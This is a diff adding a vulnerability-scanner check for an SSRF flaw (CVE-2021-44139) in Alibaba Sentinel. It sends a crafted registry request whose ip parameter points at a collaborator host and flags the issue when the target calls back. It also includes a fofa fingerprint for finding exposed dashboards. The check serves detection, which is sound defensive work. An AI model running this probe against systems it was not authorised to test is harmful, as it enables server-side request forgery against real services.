@@ -1,0 +1,32 @@
+metadata:
+    language: v1-beta
+    name: "Alibaba Sentinel SSRF "
+    description: "Alibaba Sentinel 1.8.2 is vulnerable to Server-side request forgery (SSRF)."
+    author: "Javeley"
+    tags: "SSRF", "CVE-2021-44139","Alibaba"
+
+define:
+    ssrf_path=`/registry/machine?app={random_str(5)}&appType=0&version=0&hostname={random_str(5)}&ip={generate_collaborator_address()}&port=0`
+
+given host then
+    send request:
+        method: "GET"
+        path: {ssrf_path}
+    if dns interactions then
+        if http interactions then
+            report issue:
+                severity: high
+                confidence: firm
+                detail: `CVE-2021-44139. Sentinel before 1.8.3 is vulnerable to Server-side request forgery (SSRF). You can access host/version to view the Sentinel version.  fofa body="sentinelDashboardApp"`
+                remediation: "https://github.com/alibaba/Sentinel/issues/2451"
+        else then 
+            report issue:
+                severity: high
+                confidence: firm
+                detail: `CVE-2021-44139. Sentinel before 1.8.3 is vulnerable to Server-side request forgery (SSRF). You can access host/version to view the Sentinel version.  fofa body="sentinelDashboardApp"`
+                remediation: "https://github.com/alibaba/Sentinel/issues/2451"
+				end if
+    end if
+		
+
+
